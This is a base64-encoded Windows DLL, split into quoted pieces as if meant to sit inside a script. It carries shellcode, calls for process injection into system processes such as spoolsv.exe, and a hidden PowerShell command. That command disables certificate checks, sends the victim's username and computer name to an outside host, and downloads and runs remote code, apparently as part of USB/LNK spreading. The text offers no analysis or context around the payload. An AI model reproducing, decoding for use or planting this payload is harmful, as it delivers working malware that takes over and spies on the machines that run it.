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saGVscDMyU25hcHNob3QAANQARGVsZXRlQ3JpdGljYWxTZWN0aW9uAO8ARW50ZXJDcml0aWNhbFNlY3Rpb24AAGUBRnJlZUxpYnJhcnlBbmRFeGl0VGhyZWFkAADEAUdldEN1cnJlbnRQcm9jZXNzAMUBR2V0Q3VycmVudFByb2Nlc3NJZADJAUdldEN1cnJlbnRUaHJlYWRJZAAAAwJHZXRMYXN0RXJyb3IAABMCR2V0TW9kdWxlRmlsZU5hbWVBAAAVAkdldE1vZHVsZUhhbmRsZUEAABYCR2V0TW9kdWxlSGFuZGxlRXhBAABFAkdldFByb2NBZGRyZXNzAABKAkdldFByb2Nlc3NIZWFwAAB7AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAIkCR2V0VGhyZWFkQ29udGV4dAAAlwJHZXRUaWNrQ291bnQAANACSGVhcEFsbG9jAOsCSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbgAmA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAAyA0xvY2FsQWxsb2MAADYDTG9jYWxGcmVlAG8DT3BlblByb2Nlc3MAgQNQcm9jZXNzMzJGaXJzdAAAgwNQcm9jZXNzMzJOZXh0AJMDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIA1gNSZXN1bWVUaHJlYWQAAFUEU2V0VGhyZWFkQ29udGV4dAAAZwRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAdARTbGVlcACCBFRlcm1pbmF0ZVByb2Nlc3MAAIkEVGxzR2V0VmFsdWUAlgRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAK4EVmlydHVhbEFsbG9jRXgAALYEVmlydHVhbFByb3RlY3QAALkEVmlydHVhbFF1ZXJ5AADCBFdhaXRGb3JTaW5nbGVPYmplY3QA+ARXcml0ZVByb2Nlc3NNZW1vcnkAADcAX19kbGxvbmV4aXQAjgBfYW1zZ19leGl0AAAwAV9pbml0dGVybQA0AV9pb2IAAJUBX2xvY2sAMgJfb25leGl0ALECX3N0cmljbXAAAEYDY2FsbG9jAABnA2ZyZWUAAHIDZndyaXRlAACeA21hbGxvYwAAzANzdHJjbXAAANMDc3RybGVuAADWA3N0cm5jbXAA6gNfdW5sb2NrADsEYWJvcnQAVwR2ZnByaW50ZgAAAAAAcAAAAHAAAABwAAAAcAAAAHAAAABwAAAAcAAAQURWQVBJMzIuZGxsAAAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAAAUcAAAFHAAABRwAABLRVJORUwzMi5kbGwAAAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAAAocAAAKHAAAChwAABtc3ZjcnQuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEKxrAAAAAAAAAADAHqxrcB6sawkKxrHJCsa2xTrGsYgKxrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAwBAAAdMCIwTzBiMGcwhzCQMNcw+jAFMRMxIDE2MVwxgTGUMcIxzDHYMeIxAjI'+'UMhsyITJIMk8yWjKBMogy5zIFNEc0UjRYNGI0bDR1NIU0jjTLNNY0+DRJNY01yTUmNjo2VTZnNoI2vDbgNv02gDe9NxI4JThEOFA4bDiOOKM44TjtOBg5MTlWOYY5lzmrOcc5NTpGOnQ6pTrUOt06CzscOyw7QztgO3U7tTvbO+w7Jzw/PFk8kTyjPK88xjzWPOI8/DwRPSI9OD1WPWs9fD2EPYw9mz2+PcM96D34PQk+Dj4TPhs+ID4oPjE+Oz5BPko+Wz7GPtM+8j74Pg0/dT+QP60/2D/mPwAgAAAYAQAAJzBVMGIwhzCkMLEwxjDNMNsw7TABMRExKzFPMWExZjFrMYIxjzGdMaIxrzHEMdUx2zHkMQoyHDIiMjoyQDJLMlEyWDJpMnMynTK0Ms4y4TICMxAzMDM5M4gznjOyM8oz0DPWM98z5TMYNB40MTRlNHQ0eTSCNIk0kjS1NNM02TTfNAQ1CjUxNTc1RDVpNYE1jjWYNbM1vTXINc414TXrNQM2CTbNNuE27zb2Nvs2VTdjN3E3ezeCN4g31TfhN+839jcGOCE4Lzg1ODw4hTiROJ04tTjDONE42zjiOOg4NzlROV85ZTlrOaQ5zjkiOio6Mjo6OkI6SjpSOlo6YjpqOnI6ejqCOoo6kjqaOqI6xDoAMAAADAAAAAA4AAAAQAAAEAAAAGgwbDBwMAAAAIAAABAAAAAMMBgwHDAAAACQAAAQAAAABDAIMAwwEDAAsAAAHAAAABAwMDBQMIgwqDDgMAAxIDFwMZAxAMAAAEAAAACfMKw8yjzfPBQ9aT2TPbc90z31Pf49FD41PlA+Wj5sPro+zT7iPvc+IT9JP2o/hT+XP7c/zT/hPwDQAABkAAAADzBpMG4wdzCAMKMwxjDPMPIwFTE3MUAxYjGEMaYxyDEUMk0yaTKLMroz/zTrOEU5TjliOWs5dDmYOaE5qjm+OeA5/jknOkA6Ujs3P1A/cD+dP6s/uz/KP+g/AAAA4AAAMAAAAOQ0DDU4NWI1Cja+PAM9FD03PW09fT2LPZE9pj3gPf49ID5EPm4+Ij8A8AAARAAAACYyXzKKMrsy4zIAMzMzYTN1M40zpTO7M88z4zP6MzM0TDRgNIU0qTTNNDo2TjZiNnY2ITf4Oic70TsAAAAAAQBgAAAAlTXBNdM15TUCNi82dDaJNpI2qTbBNtM22TbrNvE2/zZuN483qjf6NyI4aTh+OKk4zTjjOA45MjlIOXM5lzmpObs5wTnPOds5CTogOjE6PzpHOmI6gToLPAAQAQBYAAAAVDBsMIIwkDCeMKQwrjDYMBcxMTE/MUUxTzGCMcYx1DHaMegx7jH3MQEyIjJuMocyljKvMroy5DLtMvcy/jIIMyUzRTNlMz80JDVXNfs1AAAAIAEATAAAAJwx0DH7MQkyYDK7MuMy8jIHM1QzjTO1M8gzIjRLNG80mDTyNBY1PDVaNX41sTUBNik2PDagNhY3PjdRN2o3azixOQAAAFABABwAAADpMSQ0PTWAN6g4GzplO0s9lz8AAABgAQAMAAAAkzEAAABwAQBMAAAAHDBIMLQwNDFkMZAxvDHUMfgxHDJ8MqgyxDLwMhQzJDNIM2AzpDPoMzQ0ZDSkNPQ0BDUUNTg1oDXQNeA1HDYsNmA2wDYAkAEADAAAAB80nTQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAutH9

